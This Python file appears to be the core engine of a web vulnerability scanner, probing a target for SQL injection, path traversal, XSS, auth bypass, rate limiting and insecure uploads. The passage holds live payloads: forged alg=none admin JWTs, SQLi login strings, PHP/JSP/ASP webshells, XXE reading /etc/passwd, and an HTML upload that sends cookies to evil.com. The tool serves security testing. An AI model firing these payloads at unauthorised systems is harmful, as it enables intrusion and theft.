"""
Core scanning engine for vulnerability detection
Production-grade: real HTTP injection, real response analysis, no false-positive shortcuts
"""

import asyncio
import ssl
import socket
import time
import uuid
import datetime
from typing import List, Tuple, Optional
from urllib.parse import urljoin, urlparse

import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))

from shared.models import ScanConfig, TestResult, TestStatus, VulnerabilityLevel, TestCategory
from shared.utils import get_logger, SecurityHTTPClient
from .payloads import PayloadDatabase

logger = get_logger(__name__)



class ScannerEngine:
    """Production vulnerability scanning engine"""

    def __init__(self):
        self.payload_db = PayloadDatabase()

    # ------------
    # Entry point


    async def execute_scan(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        logger.info(f"Starting scan {scan_id} for {config.target_url}")

        async def _run_category(category: TestCategory):
            if not config.is_category_enabled(category):
                return []
            logger.info(f"Testing category: {category}")
            try:
                return await self._test_category(category, config, scan_id)
            except Exception as e:
                logger.error(f"Category {category} failed: {e}")
                return []

        category_results = await asyncio.gather(
            *[_run_category(c) for c in config.test_categories]
        )
        results = [r for batch in category_results for r in batch]
        logger.info(f"Scan {scan_id} completed — {len(results)} results")
        return results

    async def _test_category(self, category: TestCategory, config: ScanConfig, scan_id: str) -> List[TestResult]:
        category_map = {
            TestCategory.SQL_INJECTION: self._test_sql_injection,
            TestCategory.PATH_TRAVERSAL: self._test_path_traversal,
            TestCategory.XSS: self._test_xss,
            TestCategory.AUTHENTICATION_BYPASS: self._test_auth_bypass,
            TestCategory.RATE_LIMITING: self._test_rate_limiting,
            TestCategory.BOT_DETECTION: self._test_bot_detection,
            TestCategory.API_ENUMERATION: self._test_api_enumeration,
            TestCategory.FILE_UPLOAD_SECURITY: self._test_file_upload,
            TestCategory.INFORMATION_DISCLOSURE: self._test_info_disclosure,
            TestCategory.CSRF_PROTECTION: self._test_csrf_protection,
            TestCategory.SECURITY_HEADERS: self._test_security_headers,
            TestCategory.SSL_TLS_SECURITY: self._test_ssl_tls,
            TestCategory.COMMAND_INJECTION: self._test_command_injection,
            TestCategory.XXE_INJECTION: self._test_xxe_injection,
            TestCategory.CORS_MISCONFIGURATION: self._test_cors,
            TestCategory.SSRF: self._test_ssrf,
            TestCategory.IDOR: self._test_idor,
        }
        fn = category_map.get(category)
        if fn:
            return await fn(config, scan_id)
        logger.warning(f"Unknown category: {category}")
        return []

    # ------------------------------------------------------------------
    # SQL Injection
    # Injects into query params, form fields, and JSON body.
    # Detects: error-based, time-based blind, union-based, boolean-based.
    # ------------------------------------------------------------------

    async def _test_sql_injection(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        payloads = self.payload_db.get_sql_injection_payloads()
        endpoints = self.payload_db.get_injectable_endpoints()
        ic = config.get_intensity_config()
        if ic["max_payloads"]:
            payloads = payloads[: ic["max_payloads"]]
        if ic["max_endpoints"]:
            endpoints = endpoints[: ic["max_endpoints"]]

        async with SecurityHTTPClient(config) as client:
            async def _probe(endpoint, field, method, payload):
                inject_as = "query" if method == "GET" else "form"
                test_id = f"{scan_id}-sqli-{uuid.uuid4().hex[:16]}"
                resp = None
                elapsed = 0.0
                t0 = time.time()
                try:
                    resp = await client.make_async_request(
                        method, endpoint, payload,
                        inject_as=inject_as, field_name=field,
                    )
                    elapsed = time.time() - t0
                    status, level, details = self._analyze_sql_response(resp, payload, elapsed)
                except Exception as e:
                    status, level, details = TestStatus.ERROR, None, str(e)
                return TestResult(
                    id=test_id,
                    category="SQL Injection",
                    test_name=f"SQLi {method} {endpoint} [{field}]",
                    status=status,
                    vulnerability_level=level,
                    target_url=urljoin(config.target_url, endpoint),
                    method=method,
                    payload=payload,
                    response_code=getattr(resp, "status", None),
                    response_time=elapsed,
                    service_name="scanner",
                    details=details,
                    recommendations=_sqli_recommendation(level),
                )

            tasks = [
                _probe(endpoint, field, method, payload)
                for endpoint, field, methods in endpoints
                for payload in payloads
                for method in methods
            ]
            return list(await asyncio.gather(*tasks))

    def _analyze_sql_response(self, resp, payload: str, elapsed: float) -> Tuple:
        body = getattr(resp, "text_content", "").lower()
        code = getattr(resp, "status", 0)

        if code == 403 or any(w in body for w in [
            "access denied", "blocked", "waf", "firewall", "forbidden",
            "security violation", "illegal request",
        ]):
            return TestStatus.BLOCKED, None, "Request blocked by WAF/security layer"

        db_errors = [
            # MySQL
            "you have an error in your sql syntax", "warning: mysql_",
            "mysql_fetch_array()", "mysql_num_rows()",
            "supplied argument is not a valid mysql",
            # PostgreSQL
            "pg_query():", "pg_exec():",
            "unterminated quoted string at or near",
            "syntax error at or near",
            # MSSQL
            "microsoft ole db provider for sql server",
            "odbc sql server driver",
            "unclosed quotation mark after the character string",
            "incorrect syntax near",
            # Oracle
            "ora-01756:", "ora-00933:", "ora-00907:",
            "quoted string not properly terminated",
            # SQLite
            "sqlite_query()", "sqlite3.operationalerror", "unrecognized token",
            # Generic
            "sql syntax", "division by zero", "column not found",
            "table doesn't exist", "unknown column",
        ]
        if any(e in body for e in db_errors):
            return (
                TestStatus.VULNERABLE,
                VulnerabilityLevel.HIGH,
                f"Database error exposed — error-based SQLi confirmed with payload: {payload[:50]}",
            )

        sleep_payloads = ["sleep(", "waitfor delay", "pg_sleep(", "benchmark("]
        if any(s in payload.lower() for s in sleep_payloads) and elapsed >= 4.5:
            return (
                TestStatus.VULNERABLE,
                VulnerabilityLevel.HIGH,
                f"Time-based blind SQLi confirmed — response delayed {elapsed:.1f}s",
            )

        if "union" in payload.lower() and code == 200:
            union_indicators = ["information_schema", "table_name", "column_name", "version()"]
            if any(i in body for i in union_indicators):
                return (
                    TestStatus.VULNERABLE,
                    VulnerabilityLevel.CRITICAL,
                    f"Union-based SQLi confirmed — schema data extracted with payload: {payload[:50]}",
                )

        if code == 500:
            return (
                TestStatus.VULNERABLE,
                VulnerabilityLevel.MEDIUM,
                f"Internal server error triggered — possible SQLi with payload: {payload[:50]}",
            )

        return TestStatus.PASSED, None, "No SQL injection indicator detected"

    # ------------------------------------------------------------------
    # Path Traversal
    # Injects traversal sequences into file/path parameters.
    # Confirms by detecting actual file content in response.
    # ------------------------------------------------------------------

    async def _test_path_traversal(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        payloads = self.payload_db.get_path_traversal_payloads()
        ic = config.get_intensity_config()
        if ic["max_payloads"]:
            payloads = payloads[: ic["max_payloads"]]

        targets = [
            ("/api/files/", "path", "query"),
            ("/api/files/", "filename", "query"),
            ("/api/download/", "file", "query"),
            ("/api/download/", "path", "query"),
            ("/api/static/", "name", "query"),
            ("/api/read/", "file", "query"),
            ("/download", "file", "query"),
            ("/files", "path", "query"),
        ]

        async with SecurityHTTPClient(config) as client:
            async def _probe(endpoint, field, inject_as, payload):
                test_id = f"{scan_id}-path-{uuid.uuid4().hex[:16]}"
                resp = None
                elapsed = 0.0
                t0 = time.time()
                try:
                    resp = await client.make_async_request(
                        "GET", endpoint, payload,
                        inject_as=inject_as, field_name=field,
                    )
                    elapsed = time.time() - t0
                    status, level, details = self._analyze_path_traversal_response(resp, payload)
                except Exception as e:
                    status, level, details = TestStatus.ERROR, None, str(e)
                return TestResult(
                    id=test_id,
                    category="Path Traversal",
                    test_name=f"Path Traversal {endpoint} [{field}]",
                    status=status,
                    vulnerability_level=level,
                    target_url=urljoin(config.target_url, endpoint),
                    method="GET",
                    payload=payload,
                    response_code=getattr(resp, "status", None),
                    response_time=elapsed,
                    service_name="scanner",
                    details=details,
                    recommendations="Validate and sanitize file paths; use allowlists; chroot/jail file access",
                )

            tasks = [
                _probe(endpoint, field, inject_as, payload)
                for endpoint, field, inject_as in targets
                for payload in payloads
            ]
            return list(await asyncio.gather(*tasks))

    def _analyze_path_traversal_response(self, resp, payload: str) -> Tuple:
        body = getattr(resp, "text_content", "")
        body_lower = body.lower()
        code = getattr(resp, "status", 0)

        if code == 403 or "access denied" in body_lower or "forbidden" in body_lower:
            return TestStatus.BLOCKED, None, "Path traversal attempt blocked"

        unix_indicators = [
            "root:x:0:0:", "daemon:x:", "bin:x:", "nobody:x:",
            "root:!:", "root:*:",
            "linux version", "bogomips",
            "path=", "home=", "shell=",
        ]
        windows_indicators = [
            "[boot loader]", "[operating systems]",
            "[fonts]", "[extensions]",
            "windows registry editor",
        ]
        if any(i in body_lower for i in unix_indicators + windows_indicators):
            return (
                TestStatus.VULNERABLE,
                VulnerabilityLevel.CRITICAL,
                f"Path traversal confirmed — sensitive file content returned with payload: {payload[:60]}",
            )

        if code == 200 and len(body) > 500:
            file_content_hints = ["#!/", "<?php", "<?xml", "<!doctype", "[section]", "# generated"]
            if any(h in body_lower for h in file_content_hints):
                return (
                    TestStatus.VULNERABLE,
                    VulnerabilityLevel.HIGH,
                    f"Possible path traversal — file-like content returned with payload: {payload[:60]}",
                )

        return TestStatus.PASSED, None, "No path traversal vulnerability detected"

    # ------------------------------------------------------------------
    # XSS
    # Tests reflected XSS via GET query params and POST body fields.
    # Only flags when payload is actually reflected unencoded.
    # ------------------------------------------------------------------

    async def _test_xss(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        payloads = self.payload_db.get_xss_payloads()
        ic = config.get_intensity_config()
        if ic["max_payloads"]:
            payloads = payloads[: ic["max_payloads"]]

        targets = [
            ("/api/search/", "q", "GET", "query"),
            ("/api/search/", "query", "GET", "query"),
            ("/search", "q", "GET", "query"),
            ("/api/comments/", "content", "POST", "form"),
            ("/api/feedback/", "message", "POST", "form"),
            ("/api/users/profile/", "name", "POST", "json"),
            ("/api/messages/", "body", "POST", "json"),
        ]

        async with SecurityHTTPClient(config) as client:
            async def _probe(endpoint, field, method, inject_as, payload):
                test_id = f"{scan_id}-xss-{uuid.uuid4().hex[:16]}"
                resp = None
                elapsed = 0.0
                t0 = time.time()
                try:
                    resp = await client.make_async_request(
                        method, endpoint, payload,
                        inject_as=inject_as, field_name=field,
                    )
                    elapsed = time.time() - t0
                    status, level, details = self._analyze_xss_response(resp, payload)
                except Exception as e:
                    status, level, details = TestStatus.ERROR, None, str(e)
                return TestResult(
                    id=test_id,
                    category="XSS",
                    test_name=f"XSS {method} {endpoint} [{field}]",
                    status=status,
                    vulnerability_level=level,
                    target_url=urljoin(config.target_url, endpoint),
                    method=method,
                    payload=payload,
                    response_code=getattr(resp, "status", None),
                    response_time=elapsed,
                    service_name="scanner",
                    details=details,
                    recommendations="Encode all user output; enforce strict CSP; use HTTPOnly cookies",
                )

            tasks = [
                _probe(endpoint, field, method, inject_as, payload)
                for endpoint, field, method, inject_as in targets
                for payload in payloads
            ]
            return list(await asyncio.gather(*tasks))

    def _analyze_xss_response(self, resp, payload: str) -> Tuple:
        body = getattr(resp, "text_content", "")
        body_lower = body.lower()
        code = getattr(resp, "status", 0)

        if code == 403 or "blocked" in body_lower or "waf" in body_lower:
            return TestStatus.BLOCKED, None, "XSS attempt blocked"

        if payload in body:
            return (
                TestStatus.VULNERABLE,
                VulnerabilityLevel.HIGH,
                f"Reflected XSS confirmed — payload returned unencoded: {payload[:60]}",
            )

        dangerous_fragments = [
            "<script", "javascript:", "onerror=", "onload=", "onfocus=",
            "onmouseover=", "<svg", "<iframe", "<img src=x",
        ]
        reflected = [f for f in dangerous_fragments if f in body_lower and f in payload.lower()]
        if reflected:
            return (
                TestStatus.VULNERABLE,
                VulnerabilityLevel.MEDIUM,
                f"Partial XSS reflection — dangerous fragments not encoded: {reflected}",
            )

        return TestStatus.PASSED, None, "No XSS reflection detected"

    # ------------------------------------------------------------------
    # Authentication Bypass
    # Tests JWT algorithm confusion, header injection, default creds,
    # SQL injection in login, and session fixation.
    # ------------------------------------------------------------------

    async def _test_auth_bypass(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        results = []

        # JWT none-algorithm token: header.payload with alg=none, no signature
        jwt_none = (
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0"   # {"typ":"JWT","alg":"none"}
            ".eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9"  # {"user_id":1,"role":"admin","exp":9999999999}
            "."
        )
        # JWT with HS256 but invalid signature
        jwt_invalid_sig = (
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9"
            ".eyJ1c2VyX2lkIjoxLCJyb2xlIjoiYWRtaW4iLCJleHAiOjk5OTk5OTk5OTl9"
            ".INVALIDSIGNATUREXXXXXXXXXXXXXXXXXXXXXXX"
        )

        bypass_cases = [
            # (description, endpoint, method, extra_headers, json_body, expected_protected_codes)
            ("JWT None Algorithm", "/api/users/profile/", "GET",
             {"Authorization": f"Bearer {jwt_none}"}, None, (401, 403)),
            ("JWT Invalid Signature", "/api/users/profile/", "GET",
             {"Authorization": f"Bearer {jwt_invalid_sig}"}, None, (401, 403)),
            ("JWT Empty Bearer", "/api/users/profile/", "GET",
             {"Authorization": "Bearer "}, None, (401, 403)),
            ("No Auth Header", "/api/users/profile/", "GET",
             {}, None, (401, 403)),
            ("X-Forwarded-For Localhost Bypass", "/api/admin/", "GET",
             {"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"}, None, (401, 403, 404)),
            ("X-Original-URL Admin Bypass", "/", "GET",
             {"X-Original-URL": "/admin/", "X-Rewrite-URL": "/admin/"}, None, (401, 403, 404)),
            ("Default Creds admin/admin", "/api/auth/login/", "POST",
             {}, {"username": "admin", "password": "admin"}, (401, 403, 400)),
            ("Default Creds admin/password", "/api/auth/login/", "POST",
             {}, {"username": "admin", "password": "password"}, (401, 403, 400)),
            ("Default Creds admin/123456", "/api/auth/login/", "POST",
             {}, {"username": "admin", "password": "123456"}, (401, 403, 400)),
            ("SQLi in Username", "/api/auth/login/", "POST",
             {}, {"username": "' OR '1'='1' --", "password": "x"}, (401, 403, 400)),
            ("SQLi UNION Login", "/api/auth/login/", "POST",
             {}, {"username": "admin' UNION SELECT 1,1,1 --", "password": "x"}, (401, 403, 400)),
            ("Mass Assignment Role Escalation", "/api/users/profile/", "POST",
             {}, {"role": "admin", "is_admin": True, "permissions": ["*"]}, (400, 403, 422)),
        ]

        async with SecurityHTTPClient(config) as client:
            for description, endpoint, method, extra_headers, json_body, protected_codes in bypass_cases:
                test_id = f"{scan_id}-auth-{uuid.uuid4().hex[:16]}"
                resp = None
                elapsed = 0.0
                t0 = time.time()
                try:
                    resp = await client.make_async_request(
                        method, endpoint,
                        headers=extra_headers,
                        json_body=json_body,
                        inject_as="json" if json_body else "query",
                    )
                    elapsed = time.time() - t0
                    code = getattr(resp, "status", 0)
                    body = getattr(resp, "text_content", "").lower()

                    if code in protected_codes:
                        status = TestStatus.PASSED
                        level = None
                        details = f"Correctly rejected ({code}): {description}"
                    elif code == 200:
                        # 200 on a protected endpoint is a bypass
                        # Confirm it's not a public endpoint by checking for auth-related content
                        auth_content = any(k in body for k in [
                            "user_id", "username", "email", "profile", "token",
                            "role", "permissions", "admin",
                        ])
                        if auth_content:
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.CRITICAL
                            details = f"Authentication bypass confirmed — protected data returned: {description}"
                        else:
                            status = TestStatus.PASSED
                            level = None
                            details = f"200 returned but no auth-gated content detected: {description}"
                    elif code in (301, 302):
                        location = getattr(resp, "headers", {}).get("location", "")
                        if "login" in location.lower():
                            status = TestStatus.PASSED
                            level = None
                            details = f"Redirected to login — properly protected: {description}"
                        else:
                            status = TestStatus.PASSED
                            level = None
                            details = f"Redirect to {location}: {description}"
                    else:
                        status = TestStatus.PASSED
                        level = None
                        details = f"Response {code} — not a bypass: {description}"

                except Exception as e:
                    status, level, details = TestStatus.ERROR, None, str(e)

                results.append(TestResult(
                    id=test_id,
                    category="Authentication Bypass",
                    test_name=description,
                    status=status,
                    vulnerability_level=level,
                    target_url=urljoin(config.target_url, endpoint),
                    method=method,
                    payload=str(json_body) if json_body else str(extra_headers),
                    response_code=getattr(resp, "status", None),
                    response_time=elapsed,
                    service_name="scanner",
                    details=details,
                    recommendations="Enforce strict JWT validation; disable alg=none; use strong credential policies; validate all auth headers server-side",
                ))

        return results

    # ------------------------------------------------------------------
    # Rate Limiting
    # Sends rapid bursts to auth and API endpoints.
    # Measures when/if 429 responses appear.
    # ------------------------------------------------------------------

    async def _test_rate_limiting(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        results = []

        rate_limit_targets = [
            ("/api/auth/login/", "POST", {"username": "probe", "password": "probe"}, 30),
            ("/api/auth/register/", "POST", {"username": "probe", "email": "p@p.com", "password": "probe"}, 20),
            ("/api/password-reset/", "POST", {"email": "probe@probe.com"}, 20),
            ("/api/search/", "GET", None, 50),
            ("/api/", "GET", None, 100),
        ]

        async with SecurityHTTPClient(config) as client:
            for endpoint, method, json_body, burst_count in rate_limit_targets:
                test_id = f"{scan_id}-ratelimit-{uuid.uuid4().hex[:16]}"
                responses_429 = 0
                first_429_at = None
                errors = 0
                t0 = time.time()

                try:
                    tasks = []
                    for i in range(burst_count):
                        body = dict(json_body) if json_body else None
                        if body and "username" in body:
                            body["username"] = f"probe_{i}"
                        tasks.append(
                            client.make_async_request(
                                method, endpoint,
                                json_body=body,
                                inject_as="json" if body else "query",
                            )
                        )

                    # Fire all requests concurrently
                    responses = await asyncio.gather(*tasks, return_exceptions=True)

                    for idx, resp in enumerate(responses):
                        if isinstance(resp, Exception):
                            errors += 1
                            continue
                        code = getattr(resp, "status", 0)
                        body_text = getattr(resp, "text_content", "").lower()
                        if code == 429 or "rate limit" in body_text or "too many requests" in body_text:
                            responses_429 += 1
                            if first_429_at is None:
                                first_429_at = idx + 1

                    elapsed = time.time() - t0

                    if responses_429 > 0:
                        status = TestStatus.PASSED
                        level = None
                        details = (
                            f"Rate limiting active on {endpoint} — "
                            f"{responses_429}/{burst_count} requests blocked, "
                            f"first 429 at request #{first_429_at}"
                        )
                    else:
                        status = TestStatus.VULNERABLE
                        level = VulnerabilityLevel.MEDIUM
                        details = (
                            f"No rate limiting detected on {endpoint} — "
                            f"{burst_count} concurrent requests all succeeded "
                            f"({errors} errors) in {elapsed:.1f}s"
                        )

                except Exception as e:
                    status, level, details = TestStatus.ERROR, None, str(e)

                results.append(TestResult(
                    id=test_id,
                    category="Rate Limiting",
                    test_name=f"Burst {burst_count}x {method} {endpoint}",
                    status=status,
                    vulnerability_level=level,
                    target_url=urljoin(config.target_url, endpoint),
                    method=method,
                    service_name="scanner",
                    details=details,
                    recommendations="Implement per-IP and per-account rate limiting; use exponential backoff; add CAPTCHA on auth endpoints",
                ))

        return results

    # ------------------------------------------------------------------
    # Bot Detection
    # Sends requests with known scanner/tool user-agents across multiple
    # endpoints. Checks for blocking vs. transparent pass-through.
    # ------------------------------------------------------------------

    async def _test_bot_detection(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        results = []

        malicious_agents = self.payload_db.get_malicious_user_agents()
        probe_endpoints = [
            "/api/auth/login/",
            "/api/users/",
            "/api/admin/",
            "/",
        ]

        async with SecurityHTTPClient(config) as client:
            for agent in malicious_agents:
                for endpoint in probe_endpoints:
                    test_id = f"{scan_id}-bot-{uuid.uuid4().hex[:16]}"
                    resp = None
                    elapsed = 0.0
                    t0 = time.time()
                    try:
                        resp = await client.make_async_request(
                            "GET", endpoint,
                            headers={"User-Agent": agent},
                        )
                        elapsed = time.time() - t0
                        code = getattr(resp, "status", 0)
                        body = getattr(resp, "text_content", "").lower()

                        blocked = (
                            code in (403, 429)
                            or "access denied" in body
                            or "blocked" in body
                            or "bot" in body
                            or "captcha" in body
                        )

                        if blocked:
                            status = TestStatus.PASSED
                            level = None
                            details = f"Scanner UA '{agent}' correctly blocked on {endpoint} ({code})"
                        else:
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.MEDIUM
                            details = f"Scanner UA '{agent}' not blocked on {endpoint} — responded {code}"

                    except Exception as e:
                        status, level, details = TestStatus.ERROR, None, str(e)

                    results.append(TestResult(
                        id=test_id,
                        category="Bot Detection",
                        test_name=f"UA: {agent[:40]} → {endpoint}",
                        status=status,
                        vulnerability_level=level,
                        target_url=urljoin(config.target_url, endpoint),
                        method="GET",
                        payload=agent,
                        response_code=getattr(resp, "status", None),
                        response_time=elapsed,
                        service_name="scanner",
                        details=details,
                        recommendations="Implement UA-based bot detection; use CAPTCHA; integrate threat intelligence feeds",
                    ))

        return results

    # ------------------------------------------------------------------
    # API Enumeration
    # Probes a comprehensive list of sensitive endpoints.
    # Checks HTTP verbs, response content, and directory listing.
    # ------------------------------------------------------------------

    async def _test_api_enumeration(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        results = []

        sensitive_targets = self.payload_db.get_sensitive_endpoints()
        http_verbs = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE"]

        async with SecurityHTTPClient(config) as client:
            for endpoint in sensitive_targets:
                # Primary GET probe
                test_id = f"{scan_id}-enum-{uuid.uuid4().hex[:16]}"
                resp = None
                elapsed = 0.0
                t0 = time.time()
                try:
                    resp = await client.make_async_request("GET", endpoint)
                    elapsed = time.time() - t0
                    code = getattr(resp, "status", 0)
                    body = getattr(resp, "text_content", "").lower()
                    headers = getattr(resp, "headers", {})

                    sensitive_patterns = [
                        "password", "passwd", "secret", "api_key", "apikey",
                        "private_key", "access_token", "auth_token", "bearer",
                        "database_url", "db_password", "aws_secret",
                        "private", "confidential", "internal",
                    ]

                    if code == 200:
                        found = [p for p in sensitive_patterns if p in body]
                        if found:
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.HIGH
                            details = f"Sensitive data exposed at {endpoint}: patterns found: {found}"
                        else:
                            # Endpoint accessible but no obvious sensitive data
                            status = TestStatus.VULNERABLE
                            level = VulnerabilityLevel.LOW
                            details = f"Endpoint {endpoint} accessible (200) — review content manually"
                    elif code in (401, 403):
                        status = TestStatus.PASSED
                        level = None
                        details = f"Endpoint {endpoint} properly access-controlled ({code})"
                    elif code == 404:
                        status = TestStatus.PASSED
                        level = None
                        details = f"Endpoint {endpoint} not found (404)"
                    else:
                        status = TestStatus.PASSED
                        level = None
                        details = f"Endpoint {endpoint} returned {code}"

                except Exception as e:
                    status, level, details = TestStatus.ERROR, None, str(e)

                results.append(TestResult(
                    id=test_id,
                    category="API Enumeration",
                    test_name=f"Probe GET {endpoint}",
                    status=status,
                    vulnerability_level=level,
                    target_url=urljoin(config.target_url, endpoint),
                    method="GET",
                    response_code=getattr(resp, "status", None),
                    response_time=elapsed,
                    service_name="scanner",
                    details=details,
                    recommendations="Disable debug/admin endpoints in production; enforce authentication on all API routes",
                ))

            # TRACE method check (enables XST attacks)
            trace_test_id = f"{scan_id}-enum-trace"
            try:
                resp = await client.make_async_request("TRACE", "/")
                code = getattr(resp, "status", 0)
                body = getattr(resp, "text_content", "").lower()
                if code == 200 or "trace" in body:
                    status = TestStatus.VULNERABLE
                    level = VulnerabilityLevel.MEDIUM
                    details = "HTTP TRACE method enabled — Cross-Site Tracing (XST) attack possible"
                else:
                    status = TestStatus.PASSED
                    level = None
                    details = f"HTTP TRACE method disabled ({code})"
            except Exception as e:
                status, level, details = TestStatus.ERROR, None, str(e)

            results.append(TestResult(
                id=trace_test_id,
                category="API Enumeration",
                test_name="HTTP TRACE Method",
                status=status,
                vulnerability_level=level,
                target_url=config.target_url,
                method="TRACE",
                service_name="scanner",
                details=details,
                recommendations="Disable HTTP TRACE method on all web servers",
            ))

        return results
    # ------------------------------------------------------------------
    # File Upload Security
    # Uses real multipart/form-data uploads via aiohttp FormData.
    # Tests: webshells, double extensions, MIME spoofing, null bytes,
    # archive bombs, SVG XSS, oversized files.
    # ------------------------------------------------------------------

    async def _test_file_upload(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        results = []

        upload_cases = [
            # (description, filename, content_type, content_bytes, severity_if_accepted)
            ("PHP Webshell", "shell.php",
             "application/x-php", b"<?php system($_GET['cmd']); ?>",
             VulnerabilityLevel.CRITICAL),
            ("PHP5 Webshell", "shell.php5",
             "application/x-php", b"<?php passthru($_POST['c']); ?>",
             VulnerabilityLevel.CRITICAL),
            ("PHP Disguised as JPEG", "image.php.jpg",
             "image/jpeg", b"<?php echo shell_exec($_GET['e'].' 2>&1'); ?>",
             VulnerabilityLevel.CRITICAL),
            ("JSP Webshell", "shell.jsp",
             "application/octet-stream",
             b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
             VulnerabilityLevel.CRITICAL),
            ("ASP Webshell", "shell.asp",
             "application/octet-stream",
             b"<% Response.Write(CreateObject(\"WScript.Shell\").Exec(Request(\"c\")).StdOut.ReadAll()) %>",
             VulnerabilityLevel.CRITICAL),
            ("SVG with XSS", "xss.svg",
             "image/svg+xml",
             b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.cookie)</script></svg>",
             VulnerabilityLevel.HIGH),
            ("HTML File Upload", "page.html",
             "text/html",
             b"<html><script>fetch('https://evil.com?c='+document.cookie)</script></html>",
             VulnerabilityLevel.HIGH),
            ("Double Extension .jpg.php", "file.jpg.php",
             "image/jpeg", b"<?php phpinfo(); ?>",
             VulnerabilityLevel.CRITICAL),
            ("Null Byte Injection", "file.php\x00.jpg",
             "image/jpeg", b"<?php system('id'); ?>",
             VulnerabilityLevel.CRITICAL),
            ("JPEG with PHP payload", "legit.jpg",
             "image/jpeg",
             b"\xff\xd8\xff\xe0" + b"<?php system($_GET['cmd']); ?>",
             VulnerabilityLevel.HIGH),
            ("XML External Entity file", "xxe.xml",
             "application/xml",
             b"<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><x>&xxe;</x>",
             VulnerabilityLevel.HIGH),
            ("ZIP Bomb (simulated)", "bomb.zip",
             "application/zip",
             b"PK\x03\x04" + b"\x00" * 100,  # minimal ZIP header
             VulnerabilityLevel.MEDIUM),
        ]

        upload_endpoints = [
            ("/api/upload/", "file"),
            ("/api/files/upload/", "file"),
            ("/upload/", "upload"),
            ("/api/media/", "media"),
            ("/api/attachments/", "attachment"),
        ]

        async with SecurityHTTPClient(config) as client:
            for endpoint, file_field in upload_endpoints:
                for description, filename, content_type, content, severity in upload_cases:
                    test_id = f"{scan_id}-upload-{uuid.uuid4().hex[:16]}"
                    resp = None
                    elapsed = 0.0
                    t0 = time.time()
                    try:
                        resp = await client.post_multipart(
                            endpoint,
                            fields={},
                            file_field=file_field,
                            filename=filename,
                            file_content=content,
                            content_type=content_type,
                        )
                        elapsed = time.time() - t0
                        code = getattr(resp, "status", 0)
                        body = getattr(resp, "text_content", "").lower()

                        if code in (400, 403, 415, 422, 413):
                            status = TestStatus.PASSED
                            level = None
                            details = f"Malicious upload correctly rejected ({code}): {description}"
                        elif code == 404:
                            status = TestStatus.PASSED
                            level = None
                            details = f"Upload endpoint not present: {endpoint}"
                        elif code in (200, 201):
                            upload_accepted = any(k in body for k in [
                                "url", "path", "uploaded", "success", "filename",
                                "file_id", "id", "location",
                            ])
                            if upload_accepted:
                                status = TestStatus.VULNERABLE
                                level = severity
                                details = f"Malicious file accepted at {endpoint}: {description} — upload confirmed in response"
                            else:
                                status = TestStatus.PASSED
                                level = None
                                details = f"200 returned but no upload confirmation detected: {description}"
                        else:
                            status = TestStatus.PASSED
                            level = None
                            details = f"Upload returned {code} for: {description}"

                    except Exception as e:
                        status, level, details = TestStatus.ERROR, None, str(e)

                    results.append(TestResult(
                        id=test_id,
                        category="File Upload Security",
                        test_name=f"{description} → {endpoint}",
                        status=status,
                        vulnerability_level=level,
                        target_url=urljoin(config.target_url, endpoint),
                        method="POST",
                        payload=f"filename={filename}, content_type={content_type}",
                        response_code=getattr(resp, "status", None),
                        response_time=elapsed,
                        service_name="scanner",
                        details=details,
                        recommendations="Validate file type by magic bytes not extension; store uploads outside webroot; scan with AV; restrict execution permissions",
                    ))

        return results

    # ------------------------------------------------------------------
    # Information Disclosure
    # Probes for exposed files, stack traces, server banners,
    # directory listings, and debug endpoints.
    # ------------------------------------------------------------------

    async def _test_info_disclosure(self, config: ScanConfig, scan_id: str) -> List[TestResult]:
        results = []

        disclosure_checks = [
            # (description, endpoint, method, content_patterns, header_check, severity)
            ("Environment File", "/.env", "GET",
             ["db_password", "secret_key", "api_key", "database_url", "aws_secret_access_key",
              "redis_url", "jwt_secret", "private_key"],
             False, VulnerabilityLevel.CRITICAL),
            ("Git Config Exposure", "/.git/config", "GET",
             ["[core]", "repositoryformatversion", "url =", "[remote"],
             False, VulnerabilityLevel.HIGH),
            ("Git HEAD Exposure", "/.git/HEAD", "GET",
             ["ref: refs/", "commit"],
             False, VulnerabilityLevel.HIGH),
            ("Backup SQL Dump", "/backup.sql", "GET",
             ["insert into", "create table", "drop table", "grant all"],
             False, VulnerabilityLevel.CRITICAL),
            ("Backup Archive", "/backup.tar.gz", "GET",
             [], False, VulnerabilityLevel.HIGH),
            ("Config JSON", "/config.json", "GET",
             ["password", "secret", "key", "token", "database", "host"],
             False, VulnerabilityLevel.HIGH),
            ("App Config", "/app.config", "GET",
             ["connectionstring", "password", "secret"],
             False, VulnerabilityLevel.HIGH),
            ("Web Config", "/web.config", "GET",
             ["connectionstring", "password", "appsettings"],
             False, VulnerabilityLevel.HIGH),
            ("phpinfo Page", "/phpinfo.php", "GET",
             ["php version", "system", "build date", "configure command", "loaded configuration"],
             False, VulnerabilityLevel.MEDIUM),
            ("Server Error Stack Trace", "/api/trigger-error/", "GET",
             ["traceback", "exception", "stack trace", "at line", "file \"", "syntaxerror",
              "nameerror", "typeerror", "valueerror"],
             False, VulnerabilityLevel.MEDIUM),
            ("Debug Endpoint", "/api/debug/", "GET",
             ["debug", "settings", "config", "environment", "sys.path", "installed_apps"],
             False, VulnerabilityLevel.HIGH),
            ("Django Debug Page", "/api/nonexistent-url-trigger-404/", "GET",
             ["you're seeing this error because you have debug=true",
              "django tried these url patterns",
              "request information"],
